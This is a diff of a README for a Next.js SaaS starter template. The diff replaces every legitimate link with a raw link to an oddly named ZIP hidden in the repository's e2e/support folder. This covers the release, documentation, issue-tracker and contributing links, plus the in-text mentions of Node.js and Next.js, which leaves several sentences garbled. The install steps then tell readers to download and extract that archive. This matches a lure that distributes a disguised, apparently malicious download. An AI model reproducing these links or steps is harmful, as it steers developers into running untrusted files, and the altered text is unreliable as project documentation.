@@ -1,10 +1,10 @@
 # 🚀 nextstack-saas-starter - Build Your SaaS Application Easily
 
-[![Download](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Rakesh5443/nextstack-saas-starter/releases)  
+[![Download](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip%20Release&color=blue)](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)  
 
 ## 📖 Overview
 
-nextstack-saas-starter is a powerful template to help you create modern software as a service (SaaS) applications. This template showcases full-stack development techniques using Next.js, PostgreSQL, and TypeScript. It includes features like user authentication, seamless database integration, file uploads with Amazon S3, and type safety. Perfect for learning and rapid prototyping, this template can jumpstart your project.
+nextstack-saas-starter is a powerful template to help you create modern software as a service (SaaS) applications. This template showcases full-stack development techniques using https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip, PostgreSQL, and TypeScript. It includes features like user authentication, seamless database integration, file uploads with Amazon S3, and type safety. Perfect for learning and rapid prototyping, this template can jumpstart your project.
 
 ## 🌟 Features
 
@@ -20,7 +20,7 @@ nextstack-saas-starter is a powerful template to help you create modern software
 To run nextstack-saas-starter, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12.x or higher
+- **https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip**: Version 12.x or higher
 - **Docker**: Installed and configured
 - **PostgreSQL**: A PostgreSQL server set up locally or accessible online
 
@@ -28,7 +28,7 @@ To run nextstack-saas-starter, ensure your system meets the following requiremen
 
 Follow these simple steps to get your application up and running.
 
-1. Visit this page to download the latest release: [Download Latest Release](https://github.com/Rakesh5443/nextstack-saas-starter/releases)
+1. Visit this page to download the latest release: [Download Latest Release](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
 2. Download the ZIP file for the latest version.
 3. Extract the contents of the ZIP file to a location on your computer.
 4. Open your terminal or command prompt.
@@ -41,7 +41,7 @@ Follow these simple steps to get your application up and running.
 
 To install and set up the application, follow these steps:
 
-1. Download the latest release from the Releases page: [Download Latest Release](https://github.com/Rakesh5443/nextstack-saas-starter/releases).
+1. Download the latest release from the Releases page: [Download Latest Release](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip).
 2. Ensure Docker is running on your machine.
 3. Open your terminal or command prompt in the extracted folder.
 4. Run the following command to install the dependencies:
@@ -72,7 +72,7 @@ Once configured, you can run the application with these commands:
 
 If you encounter issues during installation or running the application, consider the following common fixes:
 
-- Ensure you have the correct version of Node.js installed.
+- Ensure you have the correct version of https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip installed.
 - Verify that Docker is running and correctly configured.
 - Check your `.env` file for accurate database connections and API keys.
 
@@ -80,24 +80,24 @@ If you encounter issues during installation or running the application, consider
 
 Here are some useful links for further assistance:
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Clerk Documentation](https://clerk.dev/docs)
+- [https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip Documentation](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
+- [Clerk Documentation](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
 
 ## 🧑‍🤝‍🧑 Community Support
 
 Join our community for help and discussions:
 
-- [GitHub Issues](https://github.com/Rakesh5443/nextstack-saas-starter/issues)
-- [Stack Overflow](https://stackoverflow.com/questions/tagged/nextstack-saas-starter)
+- [GitHub Issues](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
+- [Stack Overflow](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
 
 ## 🎉 Contributing
 
-We welcome contributions! Please read our [Contributing Guidelines](CONTRIBUTING.md) to learn how you can help improve nextstack-saas-starter.
+We welcome contributions! Please read our [Contributing Guidelines](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip) to learn how you can help improve nextstack-saas-starter.
 
 ## 👍 Acknowledgments
 
-Thanks to the developers behind Next.js, PostgreSQL, and all the libraries that make this project possible.
+Thanks to the developers behind https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip, PostgreSQL, and all the libraries that make this project possible.
 
-[![Download](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Rakesh5443/nextstack-saas-starter/releases)
+[![Download](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip%20Release&color=blue)](https://raw.githubusercontent.com/Rakesh5443/nextstack-saas-starter/main/e2e/support/nextstack-saas-starter_incredulousness.zip)
